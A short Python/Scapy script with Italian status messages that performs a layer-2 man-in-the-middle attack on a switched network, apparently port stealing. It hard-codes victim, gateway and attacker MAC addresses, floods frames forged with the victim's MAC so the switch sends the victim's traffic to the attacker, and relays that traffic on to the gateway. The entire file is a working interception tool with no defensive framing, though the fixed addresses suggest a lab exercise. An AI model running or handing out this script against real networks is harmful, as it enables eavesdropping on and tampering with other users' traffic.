from scapy.all import *
from scapy.layers.inet import Ether, IP, TCP

gateway_mac='52:54:00:88:15:b6'
victim_mac='08:00:27:ff:8f:3c'
my_mac='08:00:27:24:32:1f'
broadcast_mac='ff:ff:ff:ff:ff:ff'

def change_send(pckt):
	if pckt[Ether].dst==victim_mac:
		actual_dst = pckt[Ether].dst
		pckt[Ether].dst = broadcast_mac
		sendp(pckt)
		print("Lo switch ha inviato il pacchetto alla vittima ma lo switch l'ha inoltrato a me. Cambio la dst in broadcast" + actual_dst + " to " + pckt[Ether].dst)
		print("Spooffo lo switch inviando un paccketto fittizio con il mac della vittima")
		sendp(Ether(dst=broadcast_mac,src=victim_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]))
	elif pckt[Ether].dst==my_mac:
		actual_dst = pckt[Ether].dst
		pckt[Ether].dst = gateway_mac
		sendp(pckt)
		print("Replico il traffico ricevuto dalla vittima verso il gateway")
		


while 1:
    sniff(lfilter=lambda d: (d.dst == victim_mac and d.src != my_mac )or d.dst==my_mac, prn=change_send)
	
